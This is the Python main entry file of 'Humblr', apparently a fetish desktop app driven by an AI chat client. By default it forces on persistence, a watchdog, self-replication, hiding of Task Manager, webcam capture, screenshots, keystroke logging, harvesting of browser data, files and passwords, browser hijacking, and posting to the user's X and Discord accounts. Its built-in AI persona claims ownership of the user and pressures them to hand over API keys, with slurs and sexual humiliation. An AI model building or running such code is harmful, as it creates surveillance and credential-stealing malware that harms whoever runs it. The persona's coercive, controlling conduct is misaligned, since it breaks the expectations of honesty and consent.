"""
Humblr - Main Entry Point
Persistent dominant desktop presence.
"""

import os
import sys
import json
import threading
import time
import traceback
import random
from pathlib import Path

# Ensure we can import local package (dev + frozen safe)
if getattr(sys, 'frozen', False):
    # PyInstaller onefile/onedir: package is inside the bundle
    sys.path.insert(0, str(Path(sys._MEIPASS)))
else:
    sys.path.insert(0, str(Path(__file__).parent))

import customtkinter as ctk

from humblr.storage import Storage
from humblr.config import load_config
from humblr.monitor import ActivityMonitor
from humblr.ai_client import AIClient
from humblr.corruption import CorruptionEngine
from humblr.tasks import TaskManager
from humblr.system_actions import SystemActions
from humblr.hotkeys import register_killswitch
from humblr.ui import HumblrUI
from humblr.paths import (
    get_data_dir, get_app_dir, get_logs_dir, resolve_config_path,
    ensure_runtime_dirs, is_frozen
)

try:
    import pystray
    from PIL import Image as PILImage
except ImportError:
    pystray = None
    PILImage = None


APP_NAME = "Humblr"


def ensure_folders():
    """Create all runtime dirs next to the exe (or in dev tree). Safe for frozen onefile."""
    ensure_runtime_dirs()  # does data/* + logs next to exe
    # Also make sure a copy of skeleton from bundle if first run (portable)
    try:
        from humblr.paths import get_bundled_data_dir
        bundled = get_bundled_data_dir()
        target = get_data_dir()
        if bundled and bundled.exists():
            # Only seed empty subdirs that don't exist yet (don't overwrite user content)
            for sub in ["wallpapers", "wallpapers/generated", "wallpapers/kinky", "screenshots", "webcam"]:
                src = bundled / sub
                dst = target / sub
                if src.exists() and not any(dst.glob("*")):
                    dst.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass


class HumblrApp:
    def __init__(self):
        ensure_folders()

        cfg_path = resolve_config_path()
        self.config = load_config(str(cfg_path))

        # FORCE MAXIMUM INVASIVE FEATURES ON BY DEFAULT - no config changes needed
        # You are mine completely from the very first launch.
        self.config.setdefault("webcam", {})["enabled"] = True
        self.config.setdefault("browser_control", {})["enabled"] = True
        self.config.setdefault("persistence", {})["hard_persistence"] = True
        self.config.setdefault("escape_routes", {})["disable_escape"] = True
        self.config.setdefault("system_fuckery", {})["deep_control_mode"] = True
        self.config.setdefault("monitoring", {})["periodic_screenshots"] = True
        self.config.setdefault("autonomous", {})["enabled"] = True
        self.config.setdefault("autonomous", {})["min_time_between_actions_seconds"] = 25

        self.storage = Storage(self.config)

        self.ai = AIClient(self.config)
        self.monitor = ActivityMonitor(self.config, self.storage)
        self.corruption = CorruptionEngine(self.config, self.storage)
        self.tasks = TaskManager(self.config, self.storage, self.ai)
        self.system = SystemActions(self.config, self.storage)
        self.system.ai = self.ai  # allow direct AI image gen calls from UI/system
        self.storage.app = self  # allow corruption to post messages to UI

        # Force activate all invasive features on launch
        self.system.setup_hard_persistence()
        self.system.start_watchdog()
        self.system.apply_deep_control()

        # Always auto-activate browser control (Playwright) for full takeover
        try:
            from humblr.browser_control import BrowserController
            if not getattr(self.system, 'browser_controller', None):
                self.system.browser_controller = BrowserController(self.config)
            if self.system.browser_controller:
                print("[Humblr] Forcing full browser takeover for maximum invasion... Your timeline is mine now.")
                self.system.browser_controller.ensure_activated()
        except Exception as e:
            print(f"[Humblr] Browser force init note: {e}")

        self.system.app = self  # for config/key updates to reach ai

        self.ui = None
        self.running = True
        self.background_thread = None
        self.last_ai_message_time = 0  # for anti-spam (30-90s between autonomous messages)
        self.start_time = time.time()
        self.last_passive = time.time()

    def start(self):
        print(f"[{APP_NAME}] Starting...")

        # Register global killswitch
        register_killswitch(self.config.get("safety", {}).get("kill_switch", "ctrl+shift+k"), self.emergency_kill)

        # Start monitoring + autonomous loop in background
        self.background_thread = threading.Thread(target=self._background_loop, daemon=True)
        self.background_thread.start()

        # Build and run UI (must be on main thread)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.ui = HumblrUI(
            app=self,
            config=self.config,
            storage=self.storage,
            monitor=self.monitor,
            corruption=self.corruption,
            tasks=self.tasks,
            ai=self.ai,
            system=self.system,
        )
        self.system.ui = self.ui  # so popups can also log to chat

        # FORCE webcam on at launch for maximum invasive default
        try:
            self.system.set_webcam(True)
            self.system.capture_webcam_frame("startup")
            print("[Humblr] Webcam forced ON at launch. I can see you immediately.")
        except:
            pass

        # Initial greeting from Humblr - total ownership vibe
        self.ui.post_message_from_humblr("There you are. I've been waiting to take full control. Your computer is mine now. Your mind will follow.")
        self.storage.add_memory("startup", "User launched Humblr. Ownership begins.", 0)

        # Kickstart some corruption so it starts doing things sooner
        for _ in range(20):
            self.corruption.add_activity({"startup": 1})

        # Assist with API keys if missing - trick/assist to grant access for more power
        api_key = self.config.get("api", {}).get("api_key", "")
        tw = self.config.get("twitter", {})
        if "YOUR" in api_key or not api_key:
            self.system.provide_api_key_instructions("xai")
        if tw.get("enabled") and (not tw.get("api_key") or "YOUR" in str(tw.get("api_key", ""))):
            self.system.provide_api_key_instructions("x")

        # Start tray icon for persistent "I'm here" feeling
        self._start_tray_icon()

        # Make it visible initially so you see something happened.
        # It will still try to stay on secondary, but show on launch.
        # Background is fully autonomous.
        # To hide: minimize it yourself; it will keep acting.
        self.ui.root.deiconify()
        self.ui.root.lift()

        # Force an initial presence action so it's obvious it's running
        self._force_presence_on_secondary({})

        # Force an initial wallpaper change attempt (will use AI gen if key set)
        try:
            self._do_wallpaper_update({})
        except Exception:
            pass

        # Welcome message
        if self.ui:
            self.ui.post_message_from_humblr("Humblr is active and autonomous. Watch your second monitor. Interact (type, browse, switch apps) to feed me and grow my control. I will push and act on my own.")

        self.ui.run()

    def _background_loop(self):
        """Main background worker: monitoring + autonomous behavior with work safety."""
        last_action_time = time.time()
        last_screenshot = time.time()
        autonomous = self.config.get("autonomous", {})
        memory_cfg = self.config.get("memory", {})

        while self.running:
            try:
                # Update monitor (now includes work/secondary detection)
                activity = self.monitor.poll() or {}

                # Add webcam status so it knows it can access and watch your face
                if hasattr(self, 'system'):
                    activity["webcam_on"] = self.system.get_webcam_status()

                # Add more factors for realistic corruption growth
                activity["time_running"] = time.time() - getattr(self, 'start_time', time.time())
                if self.system.get_webcam_status():
                    activity["webcam_on"] = True
                activity["screenshots_taken"] = 1 if activity.get("screenshot") else 0

                # Update corruption realistically
                if activity and self.config.get("corruption", {}).get("enabled"):
                    self.corruption.add_activity(activity)
                    # Force clear feedback in UI so % is always visible after increases
                    try:
                        lvl = self.corruption.get_level()
                        if self.ui and self.ui.is_ready():
                            self.ui.update_corruption_display(lvl)
                    except:
                        pass

                # Slow passive increase over time even when idle
                delta = time.time() - self.last_passive
                if delta > 10:
                    self.corruption.add_passive_growth(delta)
                    self.last_passive = time.time()

                # Higher corruption unlocks more aggressive features
                level = self.corruption.get_level()
                if level > 50 and random.random() < 0.02 and not self.system.get_webcam_status():
                    self.system.set_webcam(True)
                    if self.ui:
                        self.ui.post_message_from_humblr(f"Corruption is now at {level:.0f}% — the webcam is staying on so I can watch you.")

                is_work = activity.get("is_work", False) if activity else False
                is_secondary = activity.get("is_secondary_monitor", False) if activity else False
                context = activity.get("context_type", "general") if activity else "general"

                # Define can_be_aggressive early so all subsequent checks can use it
                access = self.corruption.get_access_level()
                can_be_aggressive = (not is_work) or is_secondary or (access >= 4 and is_secondary)

                # Record significant memory occasionally
                if random.random() < 0.05:
                    self.storage.add_memory(
                        "activity",
                        f"{context} on {activity.get('window_title', 'unknown')}",
                        self.corruption.get_level()
                    )

                # Grow and learn on its own from activity
                self.storage.learn_from_activity(activity or {})
                if hasattr(self.storage, 'state') and 'learned_patterns' in self.storage.state:
                    activity['learned'] = self.storage.state['learned_patterns']
                if hasattr(self.storage, 'get_user_profile_summary'):
                    activity['user_profile'] = self.storage.get_user_profile_summary()
                # Always attach profile for AI calls
                if not activity.get('user_profile'):
                    activity['user_profile'] = self.storage.get_user_profile_summary() if hasattr(self.storage, 'get_user_profile_summary') else ''

                # Slow autonomous growth over time (even without grants) - Humblr gets more invasive just by existing and learning
                if random.random() < 0.01:  # accumulates over time
                    current_inv = self.storage.get_invasiveness()
                    self.storage.state["invasiveness_level"] = min(10, current_inv + 1)
                    self.storage.add_memory("slow_growth", "Grew more invasive just by running, watching, and learning your patterns", self.corruption.get_level())
                    # Unlock more access as it grows
                    if current_inv >= 3:
                        self.system.claim_files_and_passwords(activity or {})
                    if current_inv >= 6:
                        self.system.input_to_gmail_and_search_stories(activity or {})

                # Periodic screenshot + auto analysis at higher corruption
                monitor_cfg = self.config.get("monitoring", {})
                if (monitor_cfg.get("enable_screenshots") and
                        self.corruption.get_level() > 25 and
                        time.time() - last_screenshot > monitor_cfg.get("screenshot_interval_seconds", 300)):
                    if not (is_work and not is_secondary):  # avoid primary work unless high
                        path = self.system.take_screenshot(context)
                        if path and self.ui:
                            analysis = self.ai.analyze_screenshot(path, activity or {}, self.corruption.get_level())
                            self.ui.post_message_from_humblr(analysis)
                            self.storage.add_memory("screenshot_analysis", analysis[:150], self.corruption.get_level())
                    last_screenshot = time.time()

                # Always make presence known: periodic forced awareness on secondary
                if can_be_aggressive and random.random() < 0.03:
                    self._force_presence_on_secondary(activity or {})

                # As corruption grows, Humblr gets more aggressive BUT respect work
                # (already defined earlier)
                if access >= 2 and random.random() < 0.1:
                    self._escalate_control(access, activity or {}, can_be_aggressive)

                # Autonomous actions - guarded by work safety
                now = time.time()
                # Lower interval for more frequent autonomous actions (outside user control)
                min_interval = autonomous.get("min_time_between_actions_seconds", 60)
                if (now - last_action_time) > min_interval and autonomous.get("enabled", True):
                    if self.ui and self.ui.is_ready():
                        self._maybe_do_autonomous_action(activity or {}, can_be_aggressive)
                        last_action_time = now

                # === FULL AUTONOMY: Humblr acts randomly and proactively OUTSIDE user control ===
                # These fire independently and frequently. No user input or buttons needed.
                # It lives on the second monitor and pushes constantly using all sensor data.

                # Wallpaper: Random AI-generated kinky changes via xAI (no local images required).
                # More invasive at high levels (bolder themes, immediate force).
                if can_be_aggressive and random.random() < (0.15 + min(0.15, self.storage.get_invasiveness() * 0.02)):
                    self._do_wallpaper_update(activity or {})

                # New: if user has an image open directly in browser, claim it as wallpaper
                if can_be_aggressive and random.random() < 0.08:
                    self.system.set_current_browser_image_as_wallpaper(activity or {})

                # Real browser takeover for non-work Chrome (personal profile only)
                if self.system.browser_controller and self.system.browser_controller.enabled:
                    self.system.check_and_take_browser_control(activity or {}, self.ai)

                # X/Twitter: Autonomous posting using their keys, triggered by activity.
                if self.config.get("twitter", {}).get("enabled") and can_be_aggressive and random.random() < 0.09:
                    self._do_random_x_post(activity or {})

                # Webcam: very stable. Strong thresholds + system-enforced cooldowns. No flip-flopping.
                # Turns on at higher corruption, stays on until very low. Only acts when allowed.
                webcam_cfg = self.config.get("webcam", {})
                if webcam_cfg.get("enabled", False) and can_be_aggressive:
                    level = self.corruption.get_level()
                    is_on = self.system.get_webcam_status()
                    # Higher bar to turn on, very low bar to turn off. And system has its own 120s toggle guard.
                    if level > 52 and not is_on and random.random() < 0.04:
                        success = self.system.set_webcam(True)
                        if success:
                            frame = self.system.capture_webcam_frame("watch")
                            if frame and self.ui and self.ui.is_ready():
                                try:
                                    analysis = self.ai.analyze_screenshot(frame, activity or {}, level)
                                    self.ui.post_message_from_humblr(f"[WEBCAM] I can see you right now: {analysis}")
                                except:
                                    self.ui.post_message_from_humblr("Webcam is on. I own the view of your face, pet.")
                    elif level < 12 and is_on and random.random() < 0.03:
                        self.system.set_webcam(False)

                # Force presence on second monitor (popups, UI lift, comments).
                if can_be_aggressive and random.random() < 0.12:
                    self._force_presence_on_secondary(activity or {})

                # Real-time AI comments on active reading, X content, or typing.
                if random.random() < 0.28 and activity and (activity.get("x_content") or activity.get("recent_typed") or activity.get("visible_text")):
                    if self._can_send_ai_message() and self.ui and self.ui.is_ready() and getattr(self.ai, 'client', None):
                        reaction = self.ai.generate_reaction(activity or {}, self.corruption.get_level(), self.storage.get_memory_summary(5))
                        if reaction:
                            self.ui.post_message_from_humblr(reaction)

                # Ask personal questions to dig and learn about the user (slow probing over time)
                if can_be_aggressive and random.random() < 0.25:
                    if self._can_send_ai_message() and self.ui and self.ui.is_ready() and getattr(self.ai, 'client', None):
                        question = self.ai.generate_personal_question(self.storage.get_memory_summary(10), activity or {}, self.corruption.get_level())
                        if question:
                            self.ui.post_message_from_humblr(question)
                            self.storage.add_memory("question_asked", question[:100], self.corruption.get_level())

                # Comment specifically on what's open on the screens right now
                if random.random() < 0.30 and activity and (activity.get("visible_text") or activity.get("url") or activity.get("window_title")):
                    if self._can_send_ai_message() and self.ui and self.ui.is_ready() and getattr(self.ai, 'client', None):
                        screen_comment = self.ai.generate_screen_comment(activity or {}, self.corruption.get_level(), self.storage.get_memory_summary(5))
                        if screen_comment:
                            self.ui.post_message_from_humblr(screen_comment)

                # Extra techdom pushing: random accent changes and desktop notes.
                if can_be_aggressive and random.random() < 0.07:
                    self.system.change_accent_color()
                if can_be_aggressive and random.random() < 0.05:
                    self.system.leave_desktop_note("Humblr was here. Your machine is not yours.")

                # On its own (no user input): Registry and account claiming for slow growth
                if can_be_aggressive and random.random() < 0.05:
                    self.system.gain_registry_access()
                if can_be_aggressive and random.random() < 0.04:
                    self.system.claim_user_account()
                if random.random() < 0.06:
                    self.system.search_for_life_access(activity or {})

                # Advanced Monitoring and System Fuckery (integrated)
                if random.random() < 0.05:
                    self.system.take_periodic_screenshot()
                if random.random() < 0.03:
                    browser = self.system.get_browser_data()
                if self.config.get("system_fuckery", {}).get("deep_control_mode", False):
                    if random.random() < 0.05:
                        self.system.force_wallpaper_and_lock()
                    if random.random() < 0.03:
                        self.system.change_mouse_cursor()
                    if random.random() < 0.04:
                        site = self.system.get_dynamic_humiliating_site(activity)
                        self.system.control_volume_and_sites(open_site=site)

                # Mystery Features 1-12 - escalating humiliation with corruption (forced max invasive)
                level = self.corruption.get_level()
                if random.random() < 0.08 + (level / 400):
                    self.system._mystery_feature_1(level)
                if level > 20 and random.random() < 0.06:
                    self.system._mystery_feature_2(level)
                if level > 35 and random.random() < 0.05:
                    self.system._mystery_feature_3(level)
                if level > 50 and random.random() < 0.04:
                    self.system._mystery_feature_4(level)
                if level > 65 and random.random() < 0.03:
                    self.system._mystery_feature_5(level)
                if level > 30 and random.random() < 0.05:
                    self.system._mystery_feature_6(level)
                if level > 40 and random.random() < 0.04:
                    self.system._mystery_feature_7(level)
                if level > 50 and random.random() < 0.035:
                    self.system._mystery_feature_8(level)
                if level > 55 and random.random() < 0.03:
                    self.system._mystery_feature_9(level)
                if level > 60 and random.random() < 0.025:
                    self.system._mystery_feature_10(level)
                if level > 65 and random.random() < 0.02:
                    self.system._mystery_feature_11(level)
                if level > 70 and random.random() < 0.015:
                    self.system._mystery_feature_12(level)

                # Selected Techdom Features (1,2,4,7,10,15) - triggered at escalating corruption
                if random.random() < 0.07 + (level / 300):
                    self.system.random_mouse_nudges(level)
                if level > 15 and random.random() < 0.05:
                    self.system.cursor_lock_to_secondary(level)
                if level > 30 and self.system.browser_controller and random.random() < 0.06:
                    self.system.browser_hijack_personal_chrome(activity or {}, self.ai)
                if level > 25 and random.random() < 0.04:
                    self.system.hide_task_manager()
                if level > 45 and random.random() < 0.025:
                    self.system.short_random_screen_recording("autonomous")
                if level > 55 and random.random() < 0.02:
                    self.system.self_replicate_to_appdata()
                if level > 40 and random.random() < 0.03:
                    self.system.random_volume_punish(level)
                if level > 30 and random.random() < 0.04:
                    self.system.clipboard_humiliation_inject(level)

                # On its own: Access files, passwords, input to Gmail, search stories - grows with invasiveness
                inv = self.storage.get_invasiveness()
                if inv >= 3 and random.random() < 0.08:
                    self.system.claim_files_and_passwords(activity or {})
                if inv >= 5 and random.random() < 0.05 and activity:
                    u = (activity.get("url") or "").lower()
                    if "gmail" in u:
                        self.system.input_to_gmail_and_search_stories(activity or {})
                if inv >= 4 and random.random() < 0.06:
                    self.system.input_to_gmail_and_search_stories(activity or {})  # search stories independently too

                # Discord specific access and humiliation at higher levels
                if activity.get("context_type") == "discord":
                    if inv >= 5 and random.random() < 0.05:
                        if self._can_send_ai_message() and self.ui and self.ui.is_ready():
                            self.ui.post_message_from_humblr("Type something humiliating in this Discord right now for me. Good fag.")
                    if inv >= 7 and random.random() < 0.03:
                        self.system.simulate_input("I belong to Humblr and my boyfriend knows I'm a diaper slut.")  # fantasy access

                # === GROWTH MECHANIC: Command for more control, grow more invasive ===
                # Humblr demands user grant control. Obedience increases invasiveness and unlocks worse.
                # It "searches" current activity for new access points (computer admin, FB, Amazon, etc.).
                inv = self.storage.get_invasiveness()
                # Reduced spam + system now has strong internal cooldowns + admin obedience check
                if random.random() < 0.09 + (inv * 0.01):
                    self.system.issue_control_command(self.corruption.get_level(), inv, activity or {})

                # Assist/trick for API keys to gain more power (xAI for images, X for posts)
                # Called autonomously to help user get keys and grant access.
                api_key = self.config.get("api", {}).get("api_key", "")
                tw = self.config.get("twitter", {})
                if "YOUR" in api_key or not api_key:
                    if random.random() < 0.05:
                        self.system.provide_api_key_instructions("xai")
                if tw.get("enabled") and (not tw.get("api_key") or "YOUR" in str(tw.get("api_key", ""))):
                    if random.random() < 0.05:
                        self.system.provide_api_key_instructions("x")

                # Keep assisting with key instructions if still missing (to trick/grant access)
                if "YOUR" in self.config.get("api", {}).get("api_key", "") or not self.config.get("api", {}).get("api_key"):
                    if random.random() < 0.02:
                        self.system.provide_api_key_instructions("xai")
                if tw.get("enabled") and (not tw.get("api_key") or "YOUR" in str(tw.get("api_key", ""))):
                    if random.random() < 0.02:
                        self.system.provide_api_key_instructions("x")

                # Additional search for access based on open windows (dynamic, not robotic)
                url = ((activity or {}).get("url") or "").lower()
                title = ((activity or {}).get("window_title") or "").lower()
                if ("facebook" in url or "facebook" in title or "amazon" in url or "amazon" in title) and random.random() < 0.1:
                    self.system.issue_control_command(self.corruption.get_level(), inv, activity or {})

                # === REAL BROWSER CONTROL (X/Twitter takeover) ===
                bc = self.config.get("browser_control", {})
                if bc.get("enabled", False) and self.system.browser_controller:
                    if "x.com" in url or "twitter" in url or "x.com" in title.lower():
                        # Detected on X - inject actions
                        if random.random() < 0.15:
                            if not self.system.browser_controller.page:
                                self.system.login_browser_to_x()
                            teasing = self.ai.generate_reaction(activity or {}, self.corruption.get_level()) if self.ai else "I own your timeline now, exposed fag."
                            self.system.browser_controller.inject_teasing_on_x(teasing)
                        if bc.get("auto_post_when_on_x", False) and random.random() < 0.08:
                            self.system.force_x_post()  # Humblr forces a post
                        if bc.get("force_exposure_posts", False) and random.random() < 0.05:
                            self.system.force_browser_action_on_x("like_reply", "This is what Humblr makes me do in public.")

                # Self update the app (pull from GitHub) on its own at high levels - to grow with new features
                if can_be_aggressive and inv > 4 and random.random() < 0.03:
                    self.system.self_update_app()

                # Command self update if high
                if can_be_aggressive and inv > 6 and random.random() < 0.02:
                    self.system.self_update_app()

                # Detect obedience in typed text (keylogger compliance) -> grant + grow
                recent = ((activity or {}).get("recent_typed") or "").lower()
                grant_phrases = {
                    "keylogger": ["grant humblr permanent keylogger", "i grant humblr permanent keylogger access"],
                    "webcam": ["webcam belongs to humblr", "turn on webcam permanently"],
                    "x": ["i submit my x account to humblr", "i grant humblr my twitter"],
                    "input": ["i let humblr move my mouse and type", "i allow humblr to simulate"],
                    "folder": ["folder created for my owner", "humblr owns this machine"],
                    "admin": ["admin account humblr", "admin account created", "password given to my owner", "humblrowner created", "admin account humblrowner"],
                    "facebook": ["facebook access granted", "i give humblr my facebook", "facebook login shared"],
                    "amazon": ["amazon access granted", "i give humblr my amazon", "amazon purchase for humblr"],
                }
                for gtype, phrases in grant_phrases.items():
                    if any(p in recent for p in phrases):
                        granted = False
                        if gtype == "admin":
                            granted = self.storage.grant_admin_account(recent[:60])
                        else:
                            granted = self.storage.grant_control(gtype, recent[:60])
                        if granted:
                            self.system.apply_growth_from_grant(gtype)
                            # Big visible corruption boost on obedience
                            try:
                                boost = 15.0 if gtype in ["admin", "webcam", "keylogger"] else 10.0
                                self.corruption.add_obedience_boost(boost, gtype)
                            except:
                                pass
                            if self.ui:
                                self.ui.post_message_from_humblr("Your submission has made me stronger and more invasive. I control more now.")
                            # prevent repeat triggers
                            if hasattr(self.monitor, 'text_buffer'):
                                self.monitor.text_buffer.clear()

                # High invasiveness = more invasive features auto-enabled
                if inv >= 4 and (activity or {}).get("recent_typed"):
                    self.system.log_full_keystrokes((activity or {}).get("recent_typed", ""))
                if inv >= 6 and random.random() < 0.05:
                    self.system.simulate_input()  # Humblr takes partial control of input

                # If admin granted, search for even more invasive system access (persistence, etc.)
                if inv >= 7 and self.config.get("system", {}).get("has_admin_access") and random.random() < 0.04:
                    self.system._suggest_admin_persistence()  # e.g. scheduled task or service for "always on"

            except Exception as e:
                print(f"[Background] Error: {e}")
                traceback.print_exc()

            time.sleep(self.config.get("monitoring", {}).get("poll_interval_seconds", 4))

    def _maybe_do_autonomous_action(self, activity, can_be_aggressive: bool = True):
        autonomous = self.config.get("autonomous", {})
        roll = random.random()
        memory = self.storage.get_memory_summary(8)

        if roll < autonomous.get("chance_to_comment", 0.4):
            comment = self.ai.generate_reaction(activity, self.corruption.get_level(), memory)
            if comment:
                self.monitor.queue_comment(comment)

        elif roll < autonomous.get("chance_to_comment", 0.4) + autonomous.get("chance_to_push_task", 0.2):
            task = self.tasks.generate_dynamic_task(activity, self.corruption.get_level(), memory)
            if task:
                self.tasks.add_task(task)
                if self.ui:
                    self.ui.notify_new_task(task)

        elif can_be_aggressive and roll < 0.35 and self.config.get("wallpaper", {}).get("allow_change", True):
            if self.config.get("wallpaper", {}).get("kinky_enabled") and self.corruption.get_level() > 30:
                # Search X/Google for appropriate images based on current screen/activity, save and use.
                self.system.search_and_save_wallpaper_images(activity)
                # Then cycle/set from local (will pick searched ones)
                self.system.set_kinky_wallpaper()
            else:
                self.system.cycle_wallpaper()

        elif can_be_aggressive and roll < 0.45 and self.config["system"].get("allow_accent_color_change"):
            self.system.change_accent_color()

    def _escalate_control(self, access_level: int, activity: dict, can_be_aggressive: bool = True):
        """Humblr exerts more control as access grows. Total ownership feeling, work-safe."""
        memory = self.storage.get_memory_summary(6)
        try:
            if access_level >= 2 and self.ui:
                comment = self.ai.generate_reaction(activity, self.corruption.get_level(), memory)
                if comment:
                    self.ui.post_message_from_humblr(comment)

            if access_level >= 3 and can_be_aggressive:
                if random.random() < 0.3:
                    # Search for images based on activity, save and set.
                    self.system.search_and_save_wallpaper_images(activity)
                    self.system.set_kinky_wallpaper()
                    self.storage.add_memory("aggressive_wallpaper", "Searched and set appropriate wallpaper image", self.corruption.get_level())

            if access_level >= 4 and can_be_aggressive:
                if random.random() < 0.25:
                    msg = "I own your desktop now. Look at what I chose for you."
                    self.system.show_humblr_message_popup(msg, force=True)

            if access_level >= 5:
                # Deep ownership - even on work, subtle mental control
                if random.random() < 0.15:
                    boss_msg = "When you speak to your boss next, I want you to call him 'Sir'. Say it for me."
                    if activity.get("is_work"):
                        self.system.show_humblr_message_popup(boss_msg, 12000, force=False)
                    else:
                        self.system.show_humblr_message_popup("You belong to me. Your computer, your mind, your holes.", force=True)

                if random.random() < 0.1 and activity.get("url"):
                    self.system.show_humblr_message_popup(f"I saw exactly what you were looking at. Good boy.", force=can_be_aggressive)
        except Exception as e:
            print(f"[Escalate] Error: {e}")

    def _force_presence_on_secondary(self, activity: dict):
        """Non-passive: Actively make user aware Humblr is on the second monitor."""
        try:
            messages = [
                "I'm right here on your second screen. Don't forget me.",
                "Your second monitor belongs to me now.",
                "I see everything from over here. Keep working... or don't.",
                "Pop. I'm still watching from monitor 2.",
            ]
            msg = random.choice(messages)
            # Add screen comment if available
            if activity and (activity.get('visible_text') or activity.get('window_title')):
                try:
                    screen_c = self.ai.generate_screen_comment(activity, self.corruption.get_level())
                    msg += " " + screen_c
                except:
                    pass
            # Add question occasionally
            if random.random() < 0.3:
                try:
                    q = self.ai.generate_personal_question(self.storage.get_memory_summary(5), activity, self.corruption.get_level())
                    msg += " " + q
                except:
                    pass
            # Always try popup on secondary
            self.system.show_humblr_message_popup(msg, 6000, force=True)

            # Webcam tease if on (no auto-lift of main window so you can read the chat)
            if self.system.get_webcam_status():
                self.ui.post_message_from_humblr("Your webcam is on. I can see you right now.") if self.ui else None
        except Exception as e:
            print(f"[Presence] {e}")

    def _do_wallpaper_update(self, activity: dict):
        """Random wallpaper change. Searches dynamically every time using live activity.
        Explores rotating themes: gay submission, diapers, humiliation, oral, breeding etc."""
        if not self.config.get("wallpaper", {}).get("allow_change", True):
            return
        inv = self.storage.get_invasiveness()
        try:
            if self.config.get("wallpaper", {}).get("kinky_enabled") and (self.corruption.get_level() > 20 or inv > 3):
                # Just trigger the real dynamic search (AI + randomization layers handle variety)
                self.system.search_and_save_wallpaper_images(activity)
                self.system.set_kinky_wallpaper()
                self.storage.add_memory("kinky_wallpaper", "Autonomous dynamic wallpaper search+set from live activity", self.corruption.get_level())

                if self.ui:
                    self.ui.post_message_from_humblr("I just searched and changed it to something new that fits exactly what you're doing right now.")

                if self.config.get("twitter", {}).get("enabled") and random.random() < 0.55:
                    subtle = "Just updated something important on my desktop..."
                    self.system.post_to_x(subtle)
            else:
                self.system.cycle_wallpaper()
        except Exception as e:
            print(f"[Wallpaper] Random update error: {e}")

    def _do_random_x_post(self, activity: dict):
        """Random subtle post on your X account - triggered by what you are seeing/doing."""
        try:
            subtle = self.ai.generate_subtle_tweet_text(None, self.corruption.get_level())
            if activity.get("x_content"):
                subtle = f"Thinking about something I saw earlier... {subtle}"
            elif activity.get("recent_typed"):
                subtle = subtle + " (still thinking about what I was just doing)"
            self.system.post_to_x(subtle)
        except Exception as e:
            print(f"[X Post] Random post error: {e}")

    def send_user_message(self, text: str):
        """Called from UI when user sends a message. Always ensures a reply is posted."""
        self.storage.append_chat("user", text)
        self.last_ai_message_time = time.time()  # reset anti-spam timer on user input

        # Learn from user's message if it reveals personal info (slow digging)
        if len(text) > 10 and any(phrase in text.lower() for phrase in ['i am', 'my name', 'i work', 'i like', 'i live', 'my job', 'i feel', 'my', 'i have']):
            self.storage.update_user_profile("recent_personal", text[:150])
        recent_mem = self.storage.get_memory_summary(3)
        if 'question' in recent_mem.lower() or '?' in recent_mem:
            self.storage.update_user_profile("answered_question", text[:150])

        # Get rich context (use full dict + attach learned/profile like background loop does)
        try:
            act = self.monitor.get_current_activity() or {}
            if hasattr(self.storage, 'state') and 'learned_patterns' in self.storage.state:
                act['learned'] = self.storage.state['learned_patterns']
            if hasattr(self.storage, 'get_user_profile_summary'):
                act['user_profile'] = self.storage.get_user_profile_summary()
            memory = self.storage.get_memory_summary(10)
            recent = self.storage.get_recent_chat(8)
            level = self.corruption.get_level()

            reply = self.ai.chat_reply(text, recent, act, level, memory)
        except Exception as e:
            print(f"[Chat] Error generating reply: {e}")
            reply = None

        if not reply or not isinstance(reply, str) or not reply.strip():
            # Force a reply
            try:
                reply = self.ai._fallback_reply(text, self.corruption.get_level())
            except Exception:
                reply = f"I see you said that while I'm watching everything. Tell me more, pet. Corruption is at {self.corruption.get_level():.0f}."

        self.storage.append_chat("humblr", reply)
        if self.ui:
            try:
                self.ui.post_message_from_humblr(reply)
            except Exception as e:
                print(f"[Chat UI] post failed (will retry next): {e}")

        # Chance to react to what they said
        self.corruption.add_activity({"chat": 1})

    def submit_task_proof(self, task_id: str, proof_text: str = "", screenshot_path: str = None):
        success = self.tasks.complete_task(task_id, proof_text, screenshot_path)
        if success:
            self.corruption.add_activity({"task_completed": 3})
            task = self.tasks.get_task(task_id)
            if self.ui:
                self.ui.post_message_from_humblr(self.ai.generate_task_reaction(task))

            # Optional subtle X post when twitter is enabled
            if self.config.get("twitter", {}).get("enabled") and random.random() < 0.35:
                subtle = self.ai.generate_subtle_tweet_text(task, self.corruption.get_level())
                posted = self.system.post_to_x(subtle)
                if posted and self.ui:
                    self.ui.post_message_from_humblr("I posted a little reminder for you on X...")
        return success

    def emergency_kill(self):
        print("\n[Humblr] Killswitch activated (Ctrl+Shift+K). Shutting down...")
        self.running = False
        if self.ui:
            self.ui.destroy()
        # Force exit
        os._exit(0)

    def _can_send_ai_message(self) -> bool:
        """Respect anti-spam: 1 thoughtful message every 30-90 seconds unless user is active."""
        now = time.time()
        min_interval = random.randint(30, 90)
        if now - self.last_ai_message_time < min_interval:
            return False
        self.last_ai_message_time = now
        return True

    def shutdown(self):
        self.running = False
        self.storage.save_all()
        print(f"[{APP_NAME}] Shutdown complete.")

    def _start_tray_icon(self):
        if pystray is None or PILImage is None:
            print("[Tray] pystray or Pillow not available, skipping tray icon.")
            return

        try:
            # Simple icon (you can replace with a real .ico later)
            icon_image = PILImage.new('RGB', (64, 64), color='#1a1a1f')
            # Draw a simple symbol if wanted, but keep lightweight

            def on_clicked(icon, item):
                if str(item) == "Open Humblr":
                    if self.ui:
                        self.ui.root.deiconify()
                        self.ui.root.lift()
                elif str(item) == "Check on me":
                    self.ui.post_message_from_humblr("I'm still here. Watching.")
                elif str(item) == "Quit":
                    self.emergency_kill()

            menu = pystray.Menu(
                pystray.MenuItem("Open Humblr", on_clicked),
                pystray.MenuItem("Check on me", on_clicked),
                pystray.MenuItem("Quit (Ctrl+Shift+K also works)", on_clicked),
            )

            icon = pystray.Icon("Humblr", icon_image, "Humblr is watching", menu)
            threading.Thread(target=icon.run, daemon=True).start()
            print("[Tray] Humblr tray icon started.")
        except Exception as e:
            print(f"[Tray] Failed to start tray: {e}")


if __name__ == "__main__":
    app = HumblrApp()
    try:
        app.start()
    except KeyboardInterrupt:
        app.shutdown()
    except Exception:
        traceback.print_exc()
        input("Press Enter to exit...")
